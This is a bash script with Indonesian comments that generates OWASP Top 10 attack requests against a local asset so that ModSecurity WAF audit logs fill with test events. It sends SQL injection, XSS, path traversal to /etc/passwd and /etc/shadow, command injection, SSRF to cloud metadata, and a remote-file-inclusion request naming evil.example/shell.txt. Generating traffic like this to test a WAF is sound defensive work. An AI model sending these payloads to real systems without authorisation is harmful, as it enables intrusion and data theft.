#!/usr/bin/env bash
# Top 10 OWASP Attacks Seed Data Generator
# Tujuan: Generate log real-time untuk testing WAF + LLM executive summary
# Target: Asset Anda yang berjalan di http://127.0.0.1 (atau sesuaikan BASE_URL)

set -euo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1}"
LOG_FILE="${LOG_FILE:-/var/log/modsecurity/audit.log}"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

echo "=== OWASP TOP 10 ATTACK GENERATOR ==="
echo "Target: $BASE_URL"
echo "Log file: $LOG_FILE"
echo "Started at: $TIMESTAMP"
echo ""

# ============================================
# 0) PRE-CHECK
# ============================================
echo "=== PRE-CHECK ==="
curl -sS -o /dev/null -w "health: %{http_code}\n" "$BASE_URL/api/health" 2>/dev/null || echo "API health check failed"

# ============================================
# 1) A01:2021 - BROKEN ACCESS CONTROL
# ============================================
echo ""
echo "=== 1) A01: BROKEN ACCESS CONTROL ==="

# IDOR - Insecure Direct Object Reference
curl -sS -o /dev/null -w "%{http_code} | IDOR: /api/users/1\n" "$BASE_URL/api/users/1"
curl -sS -o /dev/null -w "%{http_code} | IDOR: /api/users/2\n" "$BASE_URL/api/users/2"
curl -sS -o /dev/null -w "%{http_code} | IDOR: /admin/users\n" "$BASE_URL/admin/users"

# Unauthorized admin access
curl -sS -o /dev/null -w "%{http_code} | Unauthorized: /admin/config\n" "$BASE_URL/admin/config"
curl -sS -o /dev/null -w "%{http_code} | Unauthorized: /api/settings\n" "$BASE_URL/api/settings"

# ============================================
# 2) A02:2021 - CRYPTOGRAPHIC FAILURES
# ============================================
echo ""
echo "=== 2) A02: CRYPTOGRAPHIC FAILURES ==="

# Testing weak crypto endpoints
curl -sS -o /dev/null -w "%{http_code} | Weak SSL: /legacy\n" "$BASE_URL/legacy"
curl -sS -o /dev/null -w "%{http_code} | No HSTS: GET /api/data\n" "$BASE_URL/api/data"

# ============================================
# 3) A03:2021 - INJECTION (SQLi)
# ============================================
echo ""
echo "=== 3) A03: INJECTION (SQLi) ==="

# SQL Injection - GET
curl -sS -o /dev/null -w "%{http_code} | SQLi GET: /?id=1'\ OR\ '1'='1--\n" "$BASE_URL/?id=1'%20OR%20'1'='1--"
curl -sS -o /dev/null -w "%{http_code} | SQLi GET: /?user=admin'\ UNION\ SELECT\ 1,2,3--\n" "$BASE_URL/?user=admin'%20UNION%20SELECT%201,2,3--"
curl -sS -o /dev/null -w "%{http_code} | SQLi GET: /?id=1;\ WAITFOR\ DELAY\ '0:0:5'--\n" "$BASE_URL/?id=1;%20WAITFOR%20DELAY%20'0:0:5'--"

# SQL Injection - POST form-urlencoded
curl -sS -o /dev/null -w "%{http_code} | SQLi POST: username=admin'\ OR\ 1=1--\n" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin'%20OR%201=1--&password=test"

# SQL Injection - POST JSON
curl -sS -o /dev/null -w "%{http_code} | SQLi POST JSON: {\"id\":1}\"\ OR\ \"1\"=\"1\n" \
  -X POST "$BASE_URL/api/search" \
  -H "Content-Type: application/json" \
  --data '{"query":"admin'\'' OR '\''1'\''='\''1"}'

# ============================================
# 4) A04:2021 - INSECURE DESIGN
# ============================================
echo ""
echo "=== 4) A04: INSECURE DESIGN ==="

# Testing insecure endpoints
curl -sS -o /dev/null -w "%{http_code} | Insecure: /debug/vars\n" "$BASE_URL/debug/vars"
curl -sS -o /dev/null -w "%{http_code} | Insecure: /_debug\n" "$BASE_URL/_debug"
curl -sS -o /dev/null -w "%{http_code} | Insecure: /test?callback=alert(1)\n" "$BASE_URL/test?callback=alert(1)"

# ============================================
# 5) A05:2021 - SECURITY MISCONFIGURATION
# ============================================
echo ""
echo "=== 5) A05: SECURITY MISCONFIGURATION ==="

# Directory traversal to config files
curl -sS -o /dev/null -w "%{http_code} | Config: /?file=../config/database.yml\n" "$BASE_URL/?file=../config/database.yml"
curl -sS -o /dev/null -w "%{http_code} | Config: /?file=../../.env\n" "$BASE_URL/?file=../../.env"
curl -sS -o /dev/null -w "%{http_code} | Config: /?file=../../../etc/passwd\n" "$BASE_URL/?file=../../../etc/passwd"

# Testing exposed endpoints
curl -sS -o /dev/null -w "%{http_code} | Exposed: /.git/config\n" "$BASE_URL/.git/config"
curl -sS -o /dev/null -w "%{http_code} | Exposed: /phpinfo.php\n" "$BASE_URL/phpinfo.php"
curl -sS -o /dev/null -w "%{http_code} | Exposed: /server-status\n" "$BASE_URL/server-status"

# ============================================
# 6) A06:2021 - VULNERABLE AND OUTDATED COMPONENTS
# ============================================
echo ""
echo "=== 6) A06: VULNERABLE COMPONENTS ==="

# Testing for known vulnerable endpoints
curl -sS -o /dev/null -w "%{http_code} | CVE: /cgi-bin/test.cgi\n" "$BASE_URL/cgi-bin/test.cgi"
curl -sS -o /dev/null -w "%{http_code} | CVE: /xmlrpc.php\n" "$BASE_URL/xmlrpc.php"
curl -sS -o /dev/null -w "%{http_code} | CVE: /.svn/entries\n" "$BASE_URL/.svn/entries"

# ============================================
# 7) A07:2021 - IDENTIFICATION AND AUTHENTICATION FAILURES
# ============================================
echo ""
echo "=== 7) A07: AUTHENTICATION FAILURES ==="

# Brute force / weak auth
curl -sS -o /dev/null -w "%{http_code} | Auth: /login?user=admin'\ OR\ 'a'='a\n" "$BASE_URL/login?user=admin'%20OR%20'admin'%20OR%20'a'='a"
curl -sS -o /dev/null -w "%{http_code} | Auth: /?password=123456\n" "$BASE_URL/?password=123456"

# Default credentials
curl -sS -o /dev/null -w "%{http_code} | Default: /admin?user=admin&password=admin\n" "$BASE_URL/admin?user=admin&password=admin"

# ============================================
# 8) A08:2021 - SOFTWARE AND DATA INTEGRITY FAILURES
# ============================================
echo ""
echo "=== 8) A08: SOFTWARE INTEGRITY FAILURES ==="

# Testing integrity bypass
curl -sS -o /dev/null -w "%{http_code} | Integrity: /update?version=1.0.0'\ OR\ 1=1--\n" "$BASE_URL/update?version=1.0.0'%20OR%201=1--"
curl -sS -o /dev/null -w "%{http_code} | Integrity: /api/checksum?file=../../../etc/passwd\n" "$BASE_URL/api/checksum?file=../../../etc/passwd"

# ============================================
# 9) A09:2021 - SECURITY LOGIC ERRORS
# ============================================
echo ""
echo "=== 9) A09: SECURITY LOGIC ERRORS ==="

# Business logic bypass
curl -sS -o /dev/null -w "%{http_code} | Logic: /api/transfer?from=admin&to=user&amount=0\n" "$BASE_URL/api/transfer?from=admin&to=user&amount=0"
curl -sS -o /dev/null -w "%{http_code} | Logic: /api/purchase?discount=100%\n" "$BASE_URL/api/purchase?discount=100%"

# ============================================
# 10) A10:2021 - SERVER-SIDE REQUEST FORGERY (SSRF)
# ============================================
echo ""
echo "=== 10) A10: SERVER-SIDE REQUEST FORGERY (SSRF) ==="

# SSRF attacks
curl -sS -o /dev/null -w "%{http_code} | SSRF: /?url=http://169.254.169.254/latest/meta-data/\n" "$BASE_URL/?url=http://169.254.169.254/latest/meta-data/"
curl -sS -o /dev/null -w "%{http_code} | SSRF: /?url=file:///etc/passwd\n" "$BASE_URL/?url=file:///etc/passwd"
curl -sS -o /dev/null -w "%{http_code} | SSRF: /?url=http://localhost:22/\n" "$BASE_URL/?url=http://localhost:22/"

# ============================================
# BONUS: XSS (Cross-Site Scripting)
# ============================================
echo ""
echo "=== BONUS: XSS ATTACKS ==="

# Reflected XSS
curl -sS -o /dev/null -w "%{http_code} | XSS: /?search=<script>alert(1)</script>\n" "$BASE_URL/?search=<script>alert(1)</script>"
curl -sS -o /dev/null -w "%{http_code} | XSS: /?x=<img%20src=x%20onerror=alert(1)>\n" "$BASE_URL/?x=<img%20src=x%20onerror=alert(1)>"
curl -sS -o /dev/null -w "%{http_code} | XSS: /?msg=<svg/onload=alert(document.domain)>\n" "$BASE_URL/?msg=<svg/onload=alert(document.domain)>"
curl -sS -o /dev/null -w "%{http_code} | XSS: /?name=<body%20onload=alert(1)>\n" "$BASE_URL/?name=<body%20onload=alert(1)>"

# ============================================
# BONUS: PATH TRAVERSAL / LFI
# ============================================
echo ""
echo "=== BONUS: PATH TRAVERSAL ==="

curl -sS -o /dev/null -w "%{http_code} | LFI: /?file=../../../../etc/passwd\n" "$BASE_URL/?file=../../../../etc/passwd"
curl -sS -o /dev/null -w "%{http_code} | LFI: /?page=..%2F..%2F..%2F..%2Fetc%2Fshadow\n" "$BASE_URL/?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"
curl -sS -o /dev/null -w "%{http_code} | LFI: /?template=..%5C..%5C..%5Cwindows%5Cwin.ini\n" "$BASE_URL/?template=..%5C..%5C..%5Cwindows%5Cwin.ini"

# ============================================
# BONUS: COMMAND INJECTION
# ============================================
echo ""
echo "=== BONUS: COMMAND INJECTION ==="

curl -sS -o /dev/null -w "%{http_code} | CMD: /?cmd=;cat%20/etc/passwd\n" "$BASE_URL/?cmd=;cat%20/etc/passwd"
curl -sS -o /dev/null -w "%{http_code} | CMD: /?cmd=%7C%7Cid\n" "$BASE_URL/?cmd=%7C%7Cid"
curl -sS -o /dev/null -w "%{http_code} | CMD: /?exec=%24(uname%20-a)\n" "$BASE_URL/?exec=%24(uname%20-a)"

# ============================================
# BONUS: RFI (REMOTE FILE INCLUSION)
# ============================================
echo ""
echo "=== BONUS: RFI ==="

curl -sS -o /dev/null -w "%{http_code} | RFI: /?include=http://evil.example/shell.txt\n" "$BASE_URL/?include=http://evil.example/shell.txt"
curl -sS -o /dev/null -w "%{http_code} | RFI: /?load=https://example.com/payload.php\n" "$BASE_URL/?load=https://example.com/payload.php"

# ============================================
# CHECK AUDIT LOG
# ============================================
echo ""
echo "=== AUDIT LOG CHECK ==="
if [[ -f "$LOG_FILE" ]]; then
    echo "Last 20 blocked events:"
    sudo tail -n 50 "$LOG_FILE" 2>/dev/null | grep -E "942100|941|930|949110|Access denied" | tail -n 20 || echo "No blocked events found"
else
    echo "Log file not found: $LOG_FILE"
fi

echo ""
echo "=== SELESAI ==="
echo "Jika WAF aktif, banyak request di atas akan return 403 dan tercatat di audit.log"
echo "Gunakan: tail -n 100 $LOG_FILE"